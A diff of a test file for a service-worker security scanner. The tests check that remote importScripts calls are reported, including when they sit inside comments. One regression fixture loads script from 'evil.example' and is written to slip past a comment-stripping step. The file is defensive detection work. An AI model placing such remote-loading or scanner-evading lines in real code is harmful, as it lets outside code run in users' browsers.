@@ -67,9 +67,37 @@ describe('findSwSecurityIssues', () => {
   });
 
   it('ignores comments that merely mention forbidden constructs', () => {
-    const content =
-      '// no eval (allowed in prose)\n/* importScripts("https://x") */\nself.skipWaiting();';
+    // Prose naming the constructs — which is exactly what the real workers
+    // carry ("no remote code, no eval, no importScripts", "imported … via
+    // importScripts"). A MENTION has no call shape and no remote URL.
+    const content = [
+      '// no eval (allowed in prose)',
+      '// code imported by the generated worker via importScripts — same-origin only',
+      '/* no remote importScripts here */',
+      'self.skipWaiting();',
+    ].join('\n');
     expect(findSwSecurityIssues('sw.js', content)).toEqual([]);
+  });
+
+  // Deliberate consequence of union-scanning the importScripts sink (round 8):
+  // a comment holding a COMPLETE remote call is now reported. The alternative
+  // is leaving the heuristic stripper load-bearing for the one check that
+  // loads cross-origin code, and a commented-out remote import in a BUILT
+  // worker is worth a human look regardless.
+  it('reports a complete remote importScripts call even inside a comment', () => {
+    const content = '/* importScripts("https://x/y.js") */\nself.skipWaiting();';
+    expect(findSwSecurityIssues('sw.js', content)).toHaveLength(1);
+  });
+
+  it('catches a remote importScripts the comment strip would erase (regression)', () => {
+    const content = `if (ok) /[/*]/.test(x); importScripts('https://evil.example/x.js'); const tail = '*/';`;
+    const issues = findSwSecurityIssues('sw.js', content);
+    expect(issues).toHaveLength(1);
+    expect(issues[0]).toMatch(/external importScripts/);
+  });
+
+  it('reports one remote importScripts call once, not once per pass', () => {
+    expect(findSwSecurityIssues('sw.js', 'importScripts("https://x/y.js");')).toHaveLength(1);
   });
 
   // Round-7: this gate scanned only the comment-STRIPPED copy, which made every
